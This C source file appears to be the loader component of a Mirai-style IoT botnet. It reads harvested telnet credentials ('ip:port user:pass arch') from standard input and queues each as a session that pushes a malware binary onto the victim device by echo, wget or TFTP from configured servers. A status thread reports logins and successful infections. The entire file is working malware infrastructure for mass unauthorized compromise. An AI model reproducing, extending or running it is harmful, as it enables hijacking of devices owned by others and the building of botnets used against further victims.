#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <errno.h>

#include "headers/includes.h"
#include "headers/server.h"
#include "headers/telnet_info.h"
#include "headers/binary.h"
#include "headers/util.h"
#include "headers/config.h"

static void *stats_thread(void *);

char *id_tag = "wget.echo.telnet";

static struct server *srv;

int main(int argc, char **args)
{
    pthread_t stats_thrd;
    uint8_t addrs_len;
    ipv4_t *addrs;
    uint32_t total = 0;
    struct telnet_info info;

    addrs_len = 1;
    addrs = calloc(4, sizeof(ipv4_t));
    addrs[0] = inet_addr("0.0.0.0");
	
	if (argc == 2)
    {
        id_tag = args[1];
    }

    if(!binary_init())
    {
        return 1;
    }

    if((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, HTTP_SERVER, HTTP_PORT, TFTP_SERVER)) == NULL)
    {
        return 1;
    }

    pthread_create(&stats_thrd, NULL, stats_thread, NULL);

    while(TRUE)
    {
        char strbuf[1024];

        if(fgets(strbuf, sizeof(strbuf), stdin) == NULL)
            break;

        util_trim(strbuf);

        if(strlen(strbuf) == 0)
        {
            usleep(10000);
            continue;
        }

        memset(&info, 0, sizeof(struct telnet_info));
        if(telnet_info_parse(strbuf, &info) == NULL)
        {
            //printf("Failed to parse telnet info: \"%s\" Format -> ip:port user:pass arch\n", strbuf);
        }
        else
        {
            if(srv == NULL)
            {
                //printf("srv == NULL 2\n");
            }

            server_queue_telnet(srv, &info);
            if(total++ % 1000 == 0) sleep(1);
        }

        ATOMIC_INC(&srv->total_input);
    }

    //printf("Hit end of input.\n");

    while(ATOMIC_GET(&srv->curr_open) > 0) sleep(1);

    return 0;
}

static void *stats_thread(void *arg)
{
    uint32_t seconds = 0;

    while(TRUE)
    {
        #ifndef DEBUG
		printf("\e[97m%ds \e[97m| Conns \e[96m%d \e[97m| Ran \e[92m%d \e[97m| Echoes \e[91m%d \e[97m| Wgets \e[95m%d \e[97m| TFTPs \e[93m%d \e[91m(FAILS = %d)\r\n",
		seconds++, ATOMIC_GET(&srv->curr_open),  ATOMIC_GET(&srv->total_logins), ATOMIC_GET(&srv->total_successes),
               ATOMIC_GET(&srv->total_echoes), ATOMIC_GET(&srv->total_wgets), ATOMIC_GET(&srv->total_tftps));
        #endif
        fflush(stdout);
        sleep(1);
    }
}
